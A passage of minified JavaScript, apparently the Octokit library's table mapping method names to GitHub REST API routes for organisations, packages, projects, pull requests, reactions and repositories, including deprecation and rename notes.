/orgs/{org}/issue-types/{issue_type_id}"],deleteWebhook:["DELETE /orgs/{org}/hooks/{hook_id}"],enableOrDisableSecurityProductOnAllOrgRepos:["POST /orgs/{org}/{security_product}/{enablement}",{},{deprecated:"octokit.rest.orgs.enableOrDisableSecurityProductOnAllOrgRepos() is deprecated, see https://docs.github.com/rest/orgs/orgs#enable-or-disable-a-security-feature-for-an-organization"}],get:["GET /orgs/{org}"],getAllCustomProperties:["GET /orgs/{org}/properties/schema"],getCustomProperty:["GET /orgs/{org}/properties/schema/{custom_property_name}"],getMembershipForAuthenticatedUser:["GET /user/memberships/orgs/{org}"],getMembershipForUser:["GET /orgs/{org}/memberships/{username}"],getOrgRole:["GET /orgs/{org}/organization-roles/{role_id}"],getOrgRulesetHistory:["GET /orgs/{org}/rulesets/{ruleset_id}/history"],getOrgRulesetVersion:["GET /orgs/{org}/rulesets/{ruleset_id}/history/{version_id}"],getWebhook:["GET /orgs/{org}/hooks/{hook_id}"],getWebhookConfigForOrg:["GET /orgs/{org}/hooks/{hook_id}/config"],getWebhookDelivery:["GET /orgs/{org}/hooks/{hook_id}/deliveries/{delivery_id}"],list:["GET /organizations"],listAppInstallations:["GET /orgs/{org}/installations"],listAttestations:["GET /orgs/{org}/attestations/{subject_digest}"],listBlockedUsers:["GET /orgs/{org}/blocks"],listCustomPropertiesValuesForRepos:["GET /orgs/{org}/properties/values"],listFailedInvitations:["GET /orgs/{org}/failed_invitations"],listForAuthenticatedUser:["GET /user/orgs"],listForUser:["GET /users/{username}/orgs"],listInvitationTeams:["GET /orgs/{org}/invitations/{invitation_id}/teams"],listIssueTypes:["GET /orgs/{org}/issue-types"],listMembers:["GET /orgs/{org}/members"],listMembershipsForAuthenticatedUser:["GET /user/memberships/orgs"],listOrgRoleTeams:["GET /orgs/{org}/organization-roles/{role_id}/teams"],listOrgRoleUsers:["GET /orgs/{org}/organization-roles/{role_id}/users"],listOrgRoles:["GET /orgs/{org}/organization-roles"],listOrganizationFineGrainedPermissions:["GET /orgs/{org}/organization-fine-grained-permissions"],listOutsideCollaborators:["GET /orgs/{org}/outside_collaborators"],listPatGrantRepositories:["GET /orgs/{org}/personal-access-tokens/{pat_id}/repositories"],listPatGrantRequestRepositories:["GET /orgs/{org}/personal-access-token-requests/{pat_request_id}/repositories"],listPatGrantRequests:["GET /orgs/{org}/personal-access-token-requests"],listPatGrants:["GET /orgs/{org}/personal-access-tokens"],listPendingInvitations:["GET /orgs/{org}/invitations"],listPublicMembers:["GET /orgs/{org}/public_members"],listSecurityManagerTeams:["GET /orgs/{org}/security-managers",{},{deprecated:"octokit.rest.orgs.listSecurityManagerTeams() is deprecated, see https://docs.github.com/rest/orgs/security-managers#list-security-manager-teams"}],listWebhookDeliveries:["GET /orgs/{org}/hooks/{hook_id}/deliveries"],listWebhooks:["GET /orgs/{org}/hooks"],pingWebhook:["POST /orgs/{org}/hooks/{hook_id}/pings"],redeliverWebhookDelivery:["POST /orgs/{org}/hooks/{hook_id}/deliveries/{delivery_id}/attempts"],removeCustomProperty:["DELETE /orgs/{org}/properties/schema/{custom_property_name}"],removeMember:["DELETE /orgs/{org}/members/{username}"],removeMembershipForUser:["DELETE /orgs/{org}/memberships/{username}"],removeOutsideCollaborator:["DELETE /orgs/{org}/outside_collaborators/{username}"],removePublicMembershipForAuthenticatedUser:["DELETE /orgs/{org}/public_members/{username}"],removeSecurityManagerTeam:["DELETE /orgs/{org}/security-managers/teams/{team_slug}",{},{deprecated:"octokit.rest.orgs.removeSecurityManagerTeam() is deprecated, see https://docs.github.com/rest/orgs/security-managers#remove-a-security-manager-team"}],reviewPatGrantRequest:["POST /orgs/{org}/personal-access-token-requests/{pat_request_id}"],reviewPatGrantRequestsInBulk:["POST /orgs/{org}/personal-access-token-requests"],revokeAllOrgRolesTeam:["DELETE /orgs/{org}/organization-roles/teams/{team_slug}"],revokeAllOrgRolesUser:["DELETE /orgs/{org}/organization-roles/users/{username}"],revokeOrgRoleTeam:["DELETE /orgs/{org}/organization-roles/teams/{team_slug}/{role_id}"],revokeOrgRoleUser:["DELETE /orgs/{org}/organization-roles/users/{username}/{role_id}"],setMembershipForUser:["PUT /orgs/{org}/memberships/{username}"],setPublicMembershipForAuthenticatedUser:["PUT /orgs/{org}/public_members/{username}"],unblockUser:["DELETE /orgs/{org}/blocks/{username}"],update:["PATCH /orgs/{org}"],updateIssueType:["PUT /orgs/{org}/issue-types/{issue_type_id}"],updateMembershipForAuthenticatedUser:["PATCH /user/memberships/orgs/{org}"],updatePatAccess:["POST /orgs/{org}/personal-access-tokens/{pat_id}"],updatePatAccesses:["POST /orgs/{org}/personal-access-tokens"],updateWebhook:["PATCH /orgs/{org}/hooks/{hook_id}"],updateWebhookConfigForOrg:["PATCH /orgs/{org}/hooks/{hook_id}/config"]},packages:{deletePackageForAuthenticatedUser:["DELETE /user/packages/{package_type}/{package_name}"],deletePackageForOrg:["DELETE /orgs/{org}/packages/{package_type}/{package_name}"],deletePackageForUser:["DELETE /users/{username}/packages/{package_type}/{package_name}"],deletePackageVersionForAuthenticatedUser:["DELETE /user/packages/{package_type}/{package_name}/versions/{package_version_id}"],deletePackageVersionForOrg:["DELETE /orgs/{org}/packages/{package_type}/{package_name}/versions/{package_version_id}"],deletePackageVersionForUser:["DELETE /users/{username}/packages/{package_type}/{package_name}/versions/{package_version_id}"],getAllPackageVersionsForAPackageOwnedByAnOrg:["GET /orgs/{org}/packages/{package_type}/{package_name}/versions",{},{renamed:["packages","getAllPackageVersionsForPackageOwnedByOrg"]}],getAllPackageVersionsForAPackageOwnedByTheAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}/versions",{},{renamed:["packages","getAllPackageVersionsForPackageOwnedByAuthenticatedUser"]}],getAllPackageVersionsForPackageOwnedByAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}/versions"],getAllPackageVersionsForPackageOwnedByOrg:["GET /orgs/{org}/packages/{package_type}/{package_name}/versions"],getAllPackageVersionsForPackageOwnedByUser:["GET /users/{username}/packages/{package_type}/{package_name}/versions"],getPackageForAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}"],getPackageForOrganization:["GET /orgs/{org}/packages/{package_type}/{package_name}"],getPackageForUser:["GET /users/{username}/packages/{package_type}/{package_name}"],getPackageVersionForAuthenticatedUser:["GET /user/packages/{package_type}/{package_name}/versions/{package_version_id}"],getPackageVersionForOrganization:["GET /orgs/{org}/packages/{package_type}/{package_name}/versions/{package_version_id}"],getPackageVersionForUser:["GET /users/{username}/packages/{package_type}/{package_name}/versions/{package_version_id}"],listDockerMigrationConflictingPackagesForAuthenticatedUser:["GET /user/docker/conflicts"],listDockerMigrationConflictingPackagesForOrganization:["GET /orgs/{org}/docker/conflicts"],listDockerMigrationConflictingPackagesForUser:["GET /users/{username}/docker/conflicts"],listPackagesForAuthenticatedUser:["GET /user/packages"],listPackagesForOrganization:["GET /orgs/{org}/packages"],listPackagesForUser:["GET /users/{username}/packages"],restorePackageForAuthenticatedUser:["POST /user/packages/{package_type}/{package_name}/restore{?token}"],restorePackageForOrg:["POST /orgs/{org}/packages/{package_type}/{package_name}/restore{?token}"],restorePackageForUser:["POST /users/{username}/packages/{package_type}/{package_name}/restore{?token}"],restorePackageVersionForAuthenticatedUser:["POST /user/packages/{package_type}/{package_name}/versions/{package_version_id}/restore"],restorePackageVersionForOrg:["POST /orgs/{org}/packages/{package_type}/{package_name}/versions/{package_version_id}/restore"],restorePackageVersionForUser:["POST /users/{username}/packages/{package_type}/{package_name}/versions/{package_version_id}/restore"]},privateRegistries:{createOrgPrivateRegistry:["POST /orgs/{org}/private-registries"],deleteOrgPrivateRegistry:["DELETE /orgs/{org}/private-registries/{secret_name}"],getOrgPrivateRegistry:["GET /orgs/{org}/private-registries/{secret_name}"],getOrgPublicKey:["GET /orgs/{org}/private-registries/public-key"],listOrgPrivateRegistries:["GET /orgs/{org}/private-registries"],updateOrgPrivateRegistry:["PATCH /orgs/{org}/private-registries/{secret_name}"]},projects:{addCollaborator:["PUT /projects/{project_id}/collaborators/{username}",{},{deprecated:"octokit.rest.projects.addCollaborator() is deprecated, see https://docs.github.com/rest/projects/collaborators#add-project-collaborator"}],createCard:["POST /projects/columns/{column_id}/cards",{},{deprecated:"octokit.rest.projects.createCard() is deprecated, see https://docs.github.com/rest/projects/cards#create-a-project-card"}],createColumn:["POST /projects/{project_id}/columns",{},{deprecated:"octokit.rest.projects.createColumn() is deprecated, see https://docs.github.com/rest/projects/columns#create-a-project-column"}],createForAuthenticatedUser:["POST /user/projects",{},{deprecated:"octokit.rest.projects.createForAuthenticatedUser() is deprecated, see https://docs.github.com/rest/projects/projects#create-a-user-project"}],createForOrg:["POST /orgs/{org}/projects",{},{deprecated:"octokit.rest.projects.createForOrg() is deprecated, see https://docs.github.com/rest/projects/projects#create-an-organization-project"}],createForRepo:["POST /repos/{owner}/{repo}/projects",{},{deprecated:"octokit.rest.projects.createForRepo() is deprecated, see https://docs.github.com/rest/projects/projects#create-a-repository-project"}],delete:["DELETE /projects/{project_id}",{},{deprecated:"octokit.rest.projects.delete() is deprecated, see https://docs.github.com/rest/projects/projects#delete-a-project"}],deleteCard:["DELETE /projects/columns/cards/{card_id}",{},{deprecated:"octokit.rest.projects.deleteCard() is deprecated, see https://docs.github.com/rest/projects/cards#delete-a-project-card"}],deleteColumn:["DELETE /projects/columns/{column_id}",{},{deprecated:"octokit.rest.projects.deleteColumn() is deprecated, see https://docs.github.com/rest/projects/columns#delete-a-project-column"}],get:["GET /projects/{project_id}",{},{deprecated:"octokit.rest.projects.get() is deprecated, see https://docs.github.com/rest/projects/projects#get-a-project"}],getCard:["GET /projects/columns/cards/{card_id}",{},{deprecated:"octokit.rest.projects.getCard() is deprecated, see https://docs.github.com/rest/projects/cards#get-a-project-card"}],getColumn:["GET /projects/columns/{column_id}",{},{deprecated:"octokit.rest.projects.getColumn() is deprecated, see https://docs.github.com/rest/projects/columns#get-a-project-column"}],getPermissionForUser:["GET /projects/{project_id}/collaborators/{username}/permission",{},{deprecated:"octokit.rest.projects.getPermissionForUser() is deprecated, see https://docs.github.com/rest/projects/collaborators#get-project-permission-for-a-user"}],listCards:["GET /projects/columns/{column_id}/cards",{},{deprecated:"octokit.rest.projects.listCards() is deprecated, see https://docs.github.com/rest/projects/cards#list-project-cards"}],listCollaborators:["GET /projects/{project_id}/collaborators",{},{deprecated:"octokit.rest.projects.listCollaborators() is deprecated, see https://docs.github.com/rest/projects/collaborators#list-project-collaborators"}],listColumns:["GET /projects/{project_id}/columns",{},{deprecated:"octokit.rest.projects.listColumns() is deprecated, see https://docs.github.com/rest/projects/columns#list-project-columns"}],listForOrg:["GET /orgs/{org}/projects",{},{deprecated:"octokit.rest.projects.listForOrg() is deprecated, see https://docs.github.com/rest/projects/projects#list-organization-projects"}],listForRepo:["GET /repos/{owner}/{repo}/projects",{},{deprecated:"octokit.rest.projects.listForRepo() is deprecated, see https://docs.github.com/rest/projects/projects#list-repository-projects"}],listForUser:["GET /users/{username}/projects",{},{deprecated:"octokit.rest.projects.listForUser() is deprecated, see https://docs.github.com/rest/projects/projects#list-user-projects"}],moveCard:["POST /projects/columns/cards/{card_id}/moves",{},{deprecated:"octokit.rest.projects.moveCard() is deprecated, see https://docs.github.com/rest/projects/cards#move-a-project-card"}],moveColumn:["POST /projects/columns/{column_id}/moves",{},{deprecated:"octokit.rest.projects.moveColumn() is deprecated, see https://docs.github.com/rest/projects/columns#move-a-project-column"}],removeCollaborator:["DELETE /projects/{project_id}/collaborators/{username}",{},{deprecated:"octokit.rest.projects.removeCollaborator() is deprecated, see https://docs.github.com/rest/projects/collaborators#remove-user-as-a-collaborator"}],update:["PATCH /projects/{project_id}",{},{deprecated:"octokit.rest.projects.update() is deprecated, see https://docs.github.com/rest/projects/projects#update-a-project"}],updateCard:["PATCH /projects/columns/cards/{card_id}",{},{deprecated:"octokit.rest.projects.updateCard() is deprecated, see https://docs.github.com/rest/projects/cards#update-an-existing-project-card"}],updateColumn:["PATCH /projects/columns/{column_id}",{},{deprecated:"octokit.rest.projects.updateColumn() is deprecated, see https://docs.github.com/rest/projects/columns#update-an-existing-project-column"}]},pulls:{checkIfMerged:["GET /repos/{owner}/{repo}/pulls/{pull_number}/merge"],create:["POST /repos/{owner}/{repo}/pulls"],createReplyForReviewComment:["POST /repos/{owner}/{repo}/pulls/{pull_number}/comments/{comment_id}/replies"],createReview:["POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews"],createReviewComment:["POST /repos/{owner}/{repo}/pulls/{pull_number}/comments"],deletePendingReview:["DELETE /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}"],deleteReviewComment:["DELETE /repos/{owner}/{repo}/pulls/comments/{comment_id}"],dismissReview:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}/dismissals"],get:["GET /repos/{owner}/{repo}/pulls/{pull_number}"],getReview:["GET /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}"],getReviewComment:["GET /repos/{owner}/{repo}/pulls/comments/{comment_id}"],list:["GET /repos/{owner}/{repo}/pulls"],listCommentsForReview:["GET /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}/comments"],listCommits:["GET /repos/{owner}/{repo}/pulls/{pull_number}/commits"],listFiles:["GET /repos/{owner}/{repo}/pulls/{pull_number}/files"],listRequestedReviewers:["GET /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"],listReviewComments:["GET /repos/{owner}/{repo}/pulls/{pull_number}/comments"],listReviewCommentsForRepo:["GET /repos/{owner}/{repo}/pulls/comments"],listReviews:["GET /repos/{owner}/{repo}/pulls/{pull_number}/reviews"],merge:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/merge"],removeRequestedReviewers:["DELETE /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"],requestReviewers:["POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers"],submitReview:["POST /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}/events"],update:["PATCH /repos/{owner}/{repo}/pulls/{pull_number}"],updateBranch:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/update-branch"],updateReview:["PUT /repos/{owner}/{repo}/pulls/{pull_number}/reviews/{review_id}"],updateReviewComment:["PATCH /repos/{owner}/{repo}/pulls/comments/{comment_id}"]},rateLimit:{get:["GET /rate_limit"]},reactions:{createForCommitComment:["POST /repos/{owner}/{repo}/comments/{comment_id}/reactions"],createForIssue:["POST /repos/{owner}/{repo}/issues/{issue_number}/reactions"],createForIssueComment:["POST /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions"],createForPullRequestReviewComment:["POST /repos/{owner}/{repo}/pulls/comments/{comment_id}/reactions"],createForRelease:["POST /repos/{owner}/{repo}/releases/{release_id}/reactions"],createForTeamDiscussionCommentInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}/reactions"],createForTeamDiscussionInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/reactions"],deleteForCommitComment:["DELETE /repos/{owner}/{repo}/comments/{comment_id}/reactions/{reaction_id}"],deleteForIssue:["DELETE /repos/{owner}/{repo}/issues/{issue_number}/reactions/{reaction_id}"],deleteForIssueComment:["DELETE /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions/{reaction_id}"],deleteForPullRequestComment:["DELETE /repos/{owner}/{repo}/pulls/comments/{comment_id}/reactions/{reaction_id}"],deleteForRelease:["DELETE /repos/{owner}/{repo}/releases/{release_id}/reactions/{reaction_id}"],deleteForTeamDiscussion:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/reactions/{reaction_id}"],deleteForTeamDiscussionComment:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}/reactions/{reaction_id}"],listForCommitComment:["GET /repos/{owner}/{repo}/comments/{comment_id}/reactions"],listForIssue:["GET /repos/{owner}/{repo}/issues/{issue_number}/reactions"],listForIssueComment:["GET /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions"],listForPullRequestReviewComment:["GET /repos/{owner}/{repo}/pulls/comments/{comment_id}/reactions"],listForRelease:["GET /repos/{owner}/{repo}/releases/{release_id}/reactions"],listForTeamDiscussionCommentInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}/reactions"],listForTeamDiscussionInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/reactions"]},repos:{acceptInvitation:["PATCH /user/repository_invitations/{invitation_id}",{},{renamed:["repos","acceptInvitationForAuthenticatedUser"]}],acceptInvitationForAuthenticatedUser:["PATCH /user/repository_invitations/{invitation_id}"],addAppAccessRestrictions:["POST /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps",{},{mapToData:"apps"}],addCollaborator:["PUT /repos/{owner}/{repo}/collaborators/{username}"],addStatusCheckContexts:["POST /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts",{},{mapToData:"contexts"}],addTeamAccessRestrictions:["POST /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams",{},{mapToData:"teams"}],addUserAccessRestrictions:["POST /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users",{},{mapToData:"users"}],cancelPagesDeployment:["POST /repos/{owner}/{repo}/pages/deployments/{pages_deployment_id}/cancel"],checkAutomatedSecurityFixes:["GET /repos/{owner}/{repo}/automated-security-fixes"],checkCollaborator:["GET /repos/{owner}/{repo}/collaborators/{username}"],checkPrivateVulnerabilityReporting:["GET /repos/{owner}/{repo}/private-vulnerability-reporting"],checkVulnerabilityAlerts:["GET /repos/{owner}/{repo}/vulnerability-alerts"],codeownersErrors:["GET /repos/{owner}/{repo}/codeowners/errors"],compareCommits:["GET /repos/{owner}/{repo}/compare/{base}...{head}"],compareCommitsWithBasehead:["GET /repos/{owner}/{repo}/compare/{basehead}"],createAttestation:["POST /repos/{owner}/{repo}/attestations"],createAutolink:["POST /repos/{owner}/{repo}/autolinks"],createCommitComment:["POST /repos/{owner}/{repo}/commits/{commit_sha}/comments"],createCommitSignatureProtection:["POST /repos/{owner}/{repo}/branches/{branch}/protection/required_signatures"],createCommitStatus:["POST /repos/{owner}/{repo}/statuses/{sha}"],createDeployKey:["POST /repos/{owner}/{repo}/keys"],createDeployment:["POST /repos/{owner}/{repo}/deployments"],createDeploymentBranchPolicy:["POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies"],createDeploymentProtectionRule:["POST /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules"],createDeploymentStatus:["POST /repos/{owner}/{repo}/deployments/{deployment_id}/statuses"],createDispatchEvent:["POST /repos/{owner}/{repo}/dispatches"],createForAuthenticatedUser:["POST /user/repos"],createFork:["POST /repos/{owner}/{repo}/forks"],createInOrg:["POST /orgs/{org}/repos"],createOrUpdateCustomPropertiesValues:["PATCH /repos/{owner}/{repo}/properties/values"],createOrUpdateEnvironment:["PUT /repos/{owner}/{repo}/environments/{environment_name}"],createOrUpdateFileContents:["PUT /repos/{owner}/{repo}/contents/{path}"],createOrgRuleset:["POST /orgs/{org}/rulesets"],createPagesDeployment:["POST /repos/{owner}/{repo}/pages/deployments"],createPagesSite:["POST /repos/{owner}/{repo}/pages"],createRelease:["POST /repos/{owner}/{repo}/releases"],createRepoRuleset:["POST /repos/{owner}/{repo}/rulesets"],createUsingTemplate:["POST /repos/{template_owner}/{template_repo}/generate"],createWebhook:["POST /repos/{owner}/{repo}/hooks"],declineInvitation:["DELETE /user/repository_invitations/{invitation_id}",{},{renamed:["repos","declineInvitationForAuthenticatedUser"]}],declineInvitationForAuthenticatedUser:["DELETE /user/repository_invitations/{invitation_id}"],delete:["DELETE /repos/{owner}/{repo}"],deleteAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions"],deleteAdminBranchProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/enforce_admins"],deleteAnEnvironment:["DELETE /repos/{owner}/{repo}/environments/{environment_name}"],deleteAutolink:["DELETE /repos/{owner}/{repo}/autolinks/{autolink_id}"],deleteBranchProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection"],deleteCommitComment:["DELETE /repos/{owner}/{repo}/comments/{comment_id}"],deleteCommitSignatureProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_signatures"],deleteDeployKey:["DELETE /repos/{owner}/{repo}/keys/{key_id}"],deleteDeployment:["DELETE /repos/{owner}/{repo}/deployments/{deployment_id}"],deleteDeploymentBranchPolicy:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies/{branch_policy_id}"],deleteFile:["DELETE /repos/{owner}/{repo}/contents/{path}"],deleteInvitation:["DELETE /repos/{owner}/{repo}/invitations/{invitation_id}"],deleteOrgRuleset:["DELETE /orgs/{org}/rulesets/{ruleset_id}"],deletePagesSite:["DELETE /repos/{owner}/{repo}/pages"],deletePullRequestReviewProtection:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/required_pull_request_reviews"],deleteRelease:["DELETE /repos/{owner}/{repo}/releases/{release_id}"],deleteReleaseAsset:["DELETE /repos/{owner}/{repo}/releases/assets/{asset_id}"],deleteRepoRuleset:["DELETE /repos/{owner}/{repo}/rulesets/{ruleset_id}"],deleteWebhook:["DELETE /repos/{owner}/{repo}/hooks/{hook_id}"],disableAutomatedSecurityFixes:["DELETE /repos/{owner}/{repo}/automated-security-fixes"],disableDeploymentProtectionRule:["DELETE /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules/{protection_rule_id}"],disablePrivateVulnerabilityReporting:["DELETE /repos/{owner}/{repo}/private-vulnerability-reporting"],disableVulnerabilityAlerts:["DELETE /repos/{owner}/{repo}/vulnerability-alerts"],downloadArchive:["GET /repos/{owner}/{repo}/zipball/{ref}",{},{renamed:["repos","downloadZipballArchive"]}],downloadTarballArchive:["GET /repos/{owner}/{repo}/tarball/{ref}"],downloadZipballArchive:["GET /repos/{owner}/{repo}/zipball/{ref}"],enableAutomatedSecurityFixes:["PUT /repos/{owner}/{repo}/automated-security-fixes"],enablePrivateVulnerabilityReporting:["PUT /repos/{owner}/{repo}/private-vulnerability-reporting"],enableVulnerabilityAlerts:["PUT /repos/{owner}/{repo}/vulnerability-alerts"],generateReleaseNotes:["POST /repos/{owner}/{repo}/releases/generate-notes"],get:["GET /repos/{owner}/{repo}"],getAccessRestrictions:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions"],getAdminBranchProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/enforce_admins"],getAllDeploymentProtectionRules:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules"],getAllEnvironments:["GET /repos/{owner}/{repo}/environments"],getAllStatusCheckContexts:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts"],getAllTopics:["GET /repos/{owner}/{repo}/topics"],getAppsWithAccessToProtectedBranch:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps"],getAutolink:["GET /repos/{owner}/{repo}/autolinks/{autolink_id}"],getBranch:["GET /repos/{owner}/{repo}/branches/{branch}"],getBranchProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection"],getBranchRules:["GET /repos/{owner}/{repo}/rules/branches/{branch}"],getClones:["GET /repos/{owner}/{repo}/traffic/clones"],getCodeFrequencyStats:["GET /repos/{owner}/{repo}/stats/code_frequency"],getCollaboratorPermissionLevel:["GET /repos/{owner}/{repo}/collaborators/{username}/permission"],getCombinedStatusForRef:["GET /repos/{owner}/{repo}/commits/{ref}/status"],getCommit:["GET /repos/{owner}/{repo}/commits/{ref}"],getCommitActivityStats:["GET /repos/{owner}/{repo}/stats/commit_activity"],getCommitComment:["GET /repos/{owner}/{repo}/comments/{comment_id}"],getCommitSignatureProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_signatures"],getCommunityProfileMetrics:["GET /repos/{owner}/{repo}/community/profile"],getContent:["GET /repos/{owner}/{repo}/contents/{path}"],getContributorsStats:["GET /repos/{owner}/{repo}/stats/contributors"],getCustomDeploymentProtectionRule:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules/{protection_rule_id}"],getCustomPropertiesValues:["GET /repos/{owner}/{repo}/properties/values"],getDeployKey:["GET /repos/{owner}/{repo}/keys/{key_id}"],getDeployment:["GET /repos/{owner}/{repo}/deployments/{deployment_id}"],getDeploymentBranchPolicy:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies/{branch_policy_id}"],getDeploymentStatus:["GET /repos/{owner}/{repo}/deployments/{deployment_id}/statuses/{status_id}"],getEnvironment:["GET /repos/{owner}/{repo}/environments/{environment_name}"],getLatestPagesBuild:["GET /repos/{owner}/{repo}/pages/builds/latest"],getLatestRelease:["GET /repos/{owner}/{repo}/releases/latest"],getOrgRuleSuite:["GET /orgs/{org}/rulesets/rule-suites/{rule_suite_id}"],getOrgRuleSuites:["GET /orgs/{org}/rulesets/rule-suites"],getOrgRuleset:["GET /orgs/{org}/rulesets/{ruleset_id}"],getOrgRulesets:["GET /orgs/{org}/rulesets"],getPages:["GET /repos/{owner}/{repo}/pages"],getPagesBuild:["GET /repos/{owner}/{repo}/pages/builds/{build_id}"],getPagesDeployment:["GET /repos/{owner}/{repo}/pages/deployments/{pages_deployment_id}"],getPagesHealthCheck:["GET /repos/{owner}/{repo}/pages/health"],getParticipationStats:["GET /repos/{owner}/{repo}/stats/participation"],getPullRequestReviewProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_pull_request_reviews"],getPunchCardStats:["GET /repos/{owner}/{repo}/stats/punch_card"],getReadme:["GET /repos/{owner}/{repo}/readme"],getReadmeInDirectory:["GET /repos/{owner}/{repo}/readme/{dir}"],getRelease:["GET /repos/{owner}/{repo}/releases/{release_id}"],getReleaseAsset:["GET /repos/{owner}/{repo}/releases/assets/{asset_id}"],getReleaseByTag:["GET /repos/{owner}/{repo}/releases/tags/{tag}"],getRepoRuleSuite:["GET /repos/{owner}/{repo}/rulesets/rule-suites/{rule_suite_id}"],getRepoRuleSuites:["GET /repos/{owner}/{repo}/rulesets/rule-suites"],getRepoRuleset:["GET /repos/{owner}/{repo}/rulesets/{ruleset_id}"],getRepoRulesetHistory:["GET /repos/{owner}/{repo}/rulesets/{ruleset_id}/history"],getRepoRulesetVersion:["GET /repos/{owner}/{repo}/rulesets/{ruleset_id}/history/{version_id}"],getRepoRulesets:["GET /repos/{owner}/{repo}/rulesets"],getStatusChecksProtection:["GET /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks"],getTeamsWithAccessToProtectedBranch:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams"],getTopPaths:["GET /repos/{owner}/{repo}/traffic/popular/paths"],getTopReferrers:["GET /repos/{owner}/{repo}/traffic/popular/referrers"],getUsersWithAccessToProtectedBranch:["GET /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users"],getViews:["GET /repos/{owner}/{repo}/traffic/views"],getWebhook:["GET /repos/{owner}/{repo}/hooks/{hook_id}"],getWebhookConfigForRepo:["GET /repos/{owner}/{repo}/hooks/{hook_id}/config"],getWebhookDelivery:["GET /repos/{owner}/{repo}/hooks/{hook_id}/deliveries/{delivery_id}"],listActivities:["GET /repos/{owner}/{repo}/activity"],listAttestations:["GET /repos/{owner}/{repo}/attestations/{subject_digest}"],listAutolinks:["GET /repos/{owner}/{repo}/autolinks"],listBranches:["GET /repos/{owner}/{repo}/branches"],listBranchesForHeadCommit:["GET /repos/{owner}/{repo}/commits/{commit_sha}/branches-where-head"],listCollaborators:["GET /repos/{owner}/{repo}/collaborators"],listCommentsForCommit:["GET /repos/{owner}/{repo}/commits/{commit_sha}/comments"],listCommitCommentsForRepo:["GET /repos/{owner}/{repo}/comments"],listCommitStatusesForRef:["GET /repos/{owner}/{repo}/commits/{ref}/statuses"],listCommits:["GET /repos/{owner}/{repo}/commits"],listContributors:["GET /repos/{owner}/{repo}/contributors"],listCustomDeploymentRuleIntegrations:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment_protection_rules/apps"],listDeployKeys:["GET /repos/{owner}/{repo}/keys"],listDeploymentBranchPolicies:["GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies"],listDeploymentStatuses:["GET /repos/{owner}/{repo}/deployments/{deployment_id}/statuses"],listDeployments:["GET /repos/{owner}/{repo}/deployments"],listForAuthenticatedUser:["GET /user/repos"],listForOrg:["GET /orgs/{org}/repos"],listForUser:["GET /users/{username}/repos"],listForks:["GET /repos/{owner}/{repo}/forks"],listInvitations:["GET /repos/{owner}/{repo}/invitations"],listInvitationsForAuthenticatedUser:["GET /user/repository_invitations"],listLanguages:["GET /repos/{owner}/{repo}/languages"],listPagesBuilds:["GET /repos/{owner}/{repo}/pages/builds"],listPublic:["GET /repositories"],listPullRequestsAssociatedWithCommit:["GET /repos/{owner}/{repo}/commits/{commit_sha}/pulls"],listReleaseAssets:["GET /repos/{owner}/{repo}/releases/{release_id}/assets"],listReleases:["GET /repos/{owner}/{repo}/releases"],listTags:["GET /repos/{owner}/{repo}/tags"],listTeams:["GET /repos/{owner}/{repo}/teams"],listWebhookDeliveries:["GET /repos/{owner}/{repo}/hooks/{hook_id}/deliveries"],listWebhooks:["GET /repos/{owner}/{repo}/hooks"],merge:["POST /repos/{owner}/{repo}/merges"],mergeUpstream:["POST /repos/{owner}/{repo}/merge-upstream"],pingWebhook:["POST /repos/{owner}/{repo}/hooks/{hook_id}/pings"],redeliverWebhookDelivery:["POST 